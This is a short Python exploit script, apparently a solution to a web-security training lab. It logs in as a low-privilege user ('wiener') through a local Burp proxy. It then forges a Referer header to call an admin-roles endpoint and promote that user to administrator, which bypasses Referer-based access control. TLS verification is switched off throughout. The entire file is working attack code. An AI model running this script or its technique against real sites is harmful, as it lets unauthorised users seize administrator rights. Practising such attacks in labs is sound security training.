import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def upgrade_wiener_user(s, url):

    # Login as the wiener user
    login_url = url + '/login'
    data_login = {'username': 'wiener', 'password': 'peter'}
    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
    res = r.text
    if 'Log out' in res:
        print("(+) Successfully logged in as the wiener user...")

        # Upgrade the user
        print("(+) Upgrading user to administrator...")
        upgrade_url = url + '/admin-roles?username=wiener&action=upgrade'
        headers = {'Referer': url + '/admin'}
        r = s.get(upgrade_url, headers=headers, verify=False, proxies=proxies)
        if r.status_code == 200:
            print("(+) Successfully upgraded user to administrator.")
        else:
            print("(-) Could not upgrade user to administrator.")
            sys.exit(-1)
    else:
        print("(-) Could not login as the wiener user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    s = requests.Session()
    url = sys.argv[1]
    upgrade_wiener_user(s, url)

if __name__ == "__main__":
    main()